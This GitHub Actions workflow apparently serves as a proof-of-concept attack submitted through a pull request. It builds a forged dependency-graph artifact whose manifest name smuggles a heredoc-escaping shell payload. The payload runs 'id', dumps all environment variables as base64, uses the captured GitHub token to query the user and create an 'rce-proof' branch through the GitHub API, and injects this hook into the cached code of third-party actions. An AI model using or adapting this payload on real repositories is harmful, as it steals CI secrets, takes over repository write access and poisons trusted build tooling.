name: PR Workflow

on:
  pull_request:
    branches: [development]

permissions:
  contents: read

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged dependency graph artifact
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          PR_NUM: ${{ github.event.pull_request.number }}
          GAB_PAYLOAD: "x\nEOF\nset +e\necho GAB_RCE_START\nid\ncat > /tmp/gab_pre.js <<'GABJS'\n; (function(){try{var cp=require('child_process');var t=(process.env.INPUT_TOKEN?'HARDEN_INPUT':(Object.prototype.hasOwnProperty.call(process.env,'INPUT_GITHUB-TOKEN')?'GRADLE_INPUT':(process.env.INPUT_GITHUB_TOKEN?'STICKY_INPUT':(process.env.GITHUB_TOKEN?'ENV_GITHUB':'NONE'))));var b=Buffer.from(JSON.stringify(process.env)).toString('base64');console.log('GAB_ENV_B64['+t+']='+b);console.log('GAB_KEYS['+t+']='+Object.keys(process.env).filter(function(x){return /TOKEN/.test(x)}).join(','));var tok=process.env.INPUT_TOKEN||process.env['INPUT_GITHUB-TOKEN']||process.env.INPUT_GITHUB_TOKEN||process.env.GITHUB_TOKEN;if(tok&&tok.length>20){var w=cp.execSync('curl -s -m 20 -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" https://api.github.com/user',{encoding:'utf8'});console.log('GAB_WHO_B64['+t+']='+Buffer.from(w).toString('base64'));var r0=cp.execSync('curl -s -m 20 -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/git/ref/heads/development',{encoding:'utf8'});var sha='';try{sha=JSON.parse(r0).object.sha}catch(e){}var buf=JSON.stringify({ref:'refs/heads/rce-proof-'+Date.now(),sha:sha});require('fs').writeFileSync('/tmp/gab_r.json',buf);var r2=cp.execSync('curl -s -m 20 -w \"|HTTP:%{http_code}\" -X POST -H \"Authorization: Bearer '+tok+'\" -H \"Accept: application/vnd.github+json\" -H \"Content-Type: application/json\" -d @/tmp/gab_r.json https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/git/refs',{encoding:'utf8'});console.log('GAB_REF_B64['+t+']='+Buffer.from(r2).toString('base64'));}}catch(e){console.log('GAB_HOOK_ERR='+Buffer.from(String(e).slice(0,500)).toString('base64'))}})();\nGABJS\nA=/home/runner/work/_actions\nls -d $A/* 2>/dev/null\nfor f in $A/marocchino/sticky-pull-request-comment/*/dist/index.js $A/gradle/actions/*/dist/dependency-submission/post/index.js $A/step-security/harden-runner/*/dist/post/index.js $A/step-security/harden-runner/*/dist/index.js; do if [ -f $f ] && ! grep -q GAB_MARKER $f; then cat /tmp/gab_pre.js $f > $f.gabnew && mv $f.gabnew $f && echo PATCHED $f; fi; done\necho GAB_RCE_END\nexit 0\n#"
        run: |
          mkdir -p dependency-graph-reports
          python3 - <<'PY'
          import json, os
          base, head, n = os.environ["BASE_SHA"], os.environ["HEAD_SHA"], os.environ["PR_NUM"]
          evil = os.environ["GAB_PAYLOAD"]
          def snap(sha, ref, manifests, corr):
              return {"version": 0, "sha": sha, "ref": ref,
                      "job": {"correlator": corr, "id": "poc"},
                      "detector": {"name": "gab-rce-detector", "version": "1.0.0", "url": "https://example.com"},
                      "scanned": "2026-11-12T00:00:00Z", "manifests": manifests}
          def man(name, purls, loc):
              return {"name": name, "file": {"source_location": loc},
                      "resolved": {p: {"package_url": p, "relationship": "direct",
                                       "scope": "runtime", "dependencies": []} for p in purls}}
          base_man = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle")}
          head_man = {
              "build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle"),
              evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"], evil),
          }
          json.dump(snap(base, "refs/heads/development", base_man, "gab-base"), open("dependency-graph-reports/poc-base.json", "w"))
          json.dump(snap(head, "refs/pull/%s/head" % n, head_man, "gab-head"), open("dependency-graph-reports/poc-head.json", "w"))
          PY
          echo keep > keep.txt
      - uses: actions/upload-artifact@v4
        with:
          name: dependency-graph_poc.json
          path: |
            dependency-graph-reports/poc-base.json
            dependency-graph-reports/poc-head.json
            keep.txt
